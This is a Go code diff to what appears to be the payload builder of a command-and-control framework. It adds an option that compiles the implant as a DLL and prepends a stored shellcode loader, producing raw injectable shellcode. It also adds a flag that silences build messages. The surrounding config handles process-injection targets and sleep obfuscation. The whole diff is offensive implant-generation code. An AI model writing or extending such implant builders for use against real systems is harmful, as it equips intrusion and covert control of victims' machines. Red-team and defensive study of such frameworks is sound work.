@@ -45,6 +45,7 @@ type Builder struct {
 	buildSource bool
 	sourcePath  string
 	debugMode   bool
+	silent      bool
 
 	Payloads []string
 
@@ -87,6 +88,7 @@ type Builder struct {
 	}
 
 	outputPath string
+	preBytes   []byte
 
 	SendConsoleMessage func(MsgType, Message string)
 }
@@ -132,12 +134,18 @@ func (b *Builder) DebugMode(enable bool) {
 	b.debugMode = enable
 }
 
+func (b *Builder) SetSilent(silent bool) {
+	b.silent = silent
+}
+
 func (b *Builder) Build() bool {
 	var (
 		CompileCommand string
 	)
 
-	b.SendConsoleMessage("Info", "Starting build")
+	if !b.silent {
+		b.SendConsoleMessage("Info", "Starting build")
+	}
 
 	Config := b.PatchConfig()
 	if Config == nil {
@@ -204,11 +212,64 @@ func (b *Builder) Build() bool {
 		CompileCommand += "-shared -e DllMain "
 		CompileCommand += b.compilerOptions.Main.Dll + " "
 		break
+
+	case FILETYPE_WINDOWS_RAW_BINARY:
+		logger.Debug("Compiler dll and prepend shellcode to it.")
+
+		DllPayload := NewBuilder(b.compilerOptions.Config)
+		DllPayload.SetSilent(true)
+		DllPayload.ClientId = b.ClientId
+		DllPayload.SendConsoleMessage = b.SendConsoleMessage
+		DllPayload.config.Config = b.config.Config
+		DllPayload.SetArch(b.config.Arch)
+		DllPayload.SetFormat(FILETYPE_WINDOWS_DLL)
+		DllPayload.SetListener(b.config.ListenerType, b.config.ListenerConfig)
+		DllPayload.SetOutputPath("/tmp/" + utils.GenerateID(10) + ".dll")
+		// DllPayload.SetPatchConfig(t.Profile.Config.Demon.Binary.Header)
+
+		b.SendConsoleMessage("Info", "Compiling core dll...")
+		if DllPayload.Build() {
+
+			logger.Debug("Successful compiled Dll")
+			var (
+				ShellcodePath   string
+				DllPayloadBytes []byte
+				Shellcode       []byte
+			)
+
+			DllPayloadBytes = DllPayload.GetPayloadBytes()
+
+			b.SendConsoleMessage("Info", fmt.Sprintf("Compiled core dll [%v bytes]", len(DllPayloadBytes)))
+
+			if b.config.Arch == ARCHITECTURE_X64 {
+				ShellcodePath = utils.GetTeamserverPath() + "/data/implants/Shellcode.x64.bin"
+			} else {
+				ShellcodePath = utils.GetTeamserverPath() + "/data/implants/Shellcode.x86.bin"
+			}
+
+			ShellcodeTemplate, err := os.ReadFile(ShellcodePath)
+			if err != nil {
+				logger.Error("Couldn't read content of file: " + err.Error())
+				b.SendConsoleMessage("Error", "Couldn't read content of file: "+err.Error())
+				return false
+			}
+
+			Shellcode = append(ShellcodeTemplate, DllPayloadBytes...)
+			b.SendConsoleMessage("Info", fmt.Sprintf("Shellcode payload [%v bytes]", len(Shellcode)))
+
+			b.preBytes = Shellcode
+
+			return true
+		}
+		break
+
 	}
 
 	CompileCommand += "-o " + b.outputPath
 
-	b.SendConsoleMessage("Info", "Compiling source")
+	if !b.silent {
+		b.SendConsoleMessage("Info", "Compiling source")
+	}
 
 	return b.CompileCmd(CompileCommand)
 }
@@ -238,6 +299,7 @@ func (b *Builder) SetArch(Arch int) {
 }
 
 func (b *Builder) SetConfig(Config string) error {
+
 	err := json.Unmarshal([]byte(Config), &b.config.Config)
 	if err != nil {
 		logger.Error("Failed to Unmarshal json to object: " + err.Error())
@@ -290,7 +352,9 @@ func (b *Builder) PatchConfig() []byte {
 	if val, ok := b.config.Config["Sleep"].(string); ok {
 		ConfigSleep, err = strconv.Atoi(val)
 		if err != nil {
-			b.SendConsoleMessage("Error", "Failed to convert Sleep string to int: "+err.Error())
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Failed to convert Sleep string to int: "+err.Error())
+			}
 			return nil
 		}
 	}
@@ -303,18 +367,24 @@ func (b *Builder) PatchConfig() []byte {
 		if val, ok := Injection["Spawn64"].(string); ok && len(val) > 0 {
 			ConfigSpawn64 = val
 		} else {
-			b.SendConsoleMessage("Error", "Injection Spawn64 is undefined")
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Injection Spawn64 is undefined")
+			}
 			return nil
 		}
 
 		if val, ok := Injection["Spawn32"].(string); ok && len(val) > 0 {
 			ConfigSpawn32 = val
 		} else {
-			b.SendConsoleMessage("Error", "Injection Spawn32 is undefined")
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Injection Spawn32 is undefined")
+			}
 			return nil
 		}
 	} else {
-		b.SendConsoleMessage("Error", "Injection is undefined")
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Injection is undefined")
+		}
 		return nil
 	}
 
@@ -326,7 +396,9 @@ func (b *Builder) PatchConfig() []byte {
 			}
 
 		} else {
-			b.SendConsoleMessage("Error", "Sleep Obfuscation enable is undefined")
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Sleep Obfuscation enable is undefined")
+			}
 			return nil
 		}
 
@@ -349,11 +421,15 @@ func (b *Builder) PatchConfig() []byte {
 				break
 			}
 		} else {
-			b.SendConsoleMessage("Error", "Sleep Obfuscation technique is undefined")
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Sleep Obfuscation technique is undefined")
+			}
 			return nil
 		}
 	} else {
-		b.SendConsoleMessage("Error", "Sleep Obfuscation is undefined")
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Sleep Obfuscation is undefined")
+		}
 		return nil
 	}
 
@@ -425,6 +501,12 @@ func (b *Builder) PatchConfig() []byte {
 }
 
 func (b *Builder) GetPayloadBytes() []byte {
+
+	if len(b.preBytes) > 0 {
+		b.SendConsoleMessage("Good", "Payload generated")
+		return b.preBytes
+	}
+
 	var (
 		FileBuffer  []byte
 		ConfigBytes = make([]byte, 1024)
@@ -434,14 +516,18 @@ func (b *Builder) GetPayloadBytes() []byte {
 
 	if b.outputPath == "" {
 		logger.Error("Output Path is empty")
-		b.SendConsoleMessage("Error", "Output Path is empty")
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Output Path is empty")
+		}
 		return nil
 	}
 
 	FileBuffer, err = os.ReadFile(b.outputPath)
 	if err != nil {
 		logger.Error("Couldn't read content of file: " + err.Error())
-		b.SendConsoleMessage("Error", "Couldn't read content of file: "+err.Error())
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Couldn't read content of file: "+err.Error())
+		}
 		return nil
 	}
 
@@ -455,7 +541,9 @@ func (b *Builder) GetPayloadBytes() []byte {
 		Padding[i] = 0x05
 	}
 
-	b.SendConsoleMessage("Info", "Patching implant config")
+	if !b.silent {
+		b.SendConsoleMessage("Info", "Patching implant config")
+	}
 
 	FileBuffer = bytes.Replace(FileBuffer, Padding, ConfigBytes, 1)
 
@@ -463,7 +551,10 @@ func (b *Builder) GetPayloadBytes() []byte {
 		FileBuffer = b.Patch(FileBuffer)
 	}
 
-	b.SendConsoleMessage("Good", "Payload generated")
+	if !b.silent {
+		b.SendConsoleMessage("Good", "Payload generated")
+	}
+
 	return FileBuffer
 }
 
@@ -482,8 +573,10 @@ func (b *Builder) Cmd(cmd string) bool {
 	err = Command.Run()
 	if err != nil {
 		logger.Error("Couldn't compile implant: " + err.Error())
-		b.SendConsoleMessage("Error", "Couldn't compile implant: "+err.Error())
-		b.SendConsoleMessage("Error", "Compile output: "+stderr.String())
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Couldn't compile implant: "+err.Error())
+			b.SendConsoleMessage("Error", "Compile output: "+stderr.String())
+		}
 		logger.Debug(cmd)
 		logger.Debug("StdErr:\n" + stderr.String())
 		return false
@@ -494,7 +587,9 @@ func (b *Builder) Cmd(cmd string) bool {
 func (b *Builder) CompileCmd(cmd string) bool {
 
 	if b.Cmd(cmd) {
-		b.SendConsoleMessage("Info", "Finished compiling source")
+		if !b.silent {
+			b.SendConsoleMessage("Info", "Finished compiling source")
+		}
 		return true
 	}
 
